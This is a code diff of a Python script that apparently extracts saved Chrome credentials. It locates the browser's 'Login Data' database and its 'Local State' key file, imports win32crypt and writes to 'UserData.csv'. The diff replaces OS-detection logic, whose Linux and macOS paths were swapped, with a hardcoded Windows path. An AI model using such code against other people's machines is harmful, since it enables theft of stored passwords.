@@ -3,7 +3,6 @@
 
 import sys
 import os
-import platform
 import json
 import base64
 import win32crypt
@@ -14,16 +13,7 @@ import datetime
 # Global variables
 out_file_name = "UserData.csv"
 
-os_name = platform.system()
-if os_name == "Windows":
-    chrome_user_data_path = os.path.normpath(os.getenv("LOCALAPPDATA") + "/Google/Chrome/User Data")
-elif os_name == "Linux":
-    chrome_user_data_path = os.path.normpath(os.path.expanduser("~") + "/Library/Application Support/Google/Chrome")
-elif os_name == "Darwin":
-    chrome_user_data_path = os.path.normpath(os.path.expanduser("~") + "/.config/google-chrome")
-else:
-    sys.exit("Unsupported OS")
-
+chrome_user_data_path = os.path.normpath(os.getenv("LOCALAPPDATA") + "/Google/Chrome/User Data")
 chrome_login_data_path = os.path.join(chrome_user_data_path, "Default", "Login Data")
 chrome_key_path = os.path.join(chrome_user_data_path, "Local State")
 
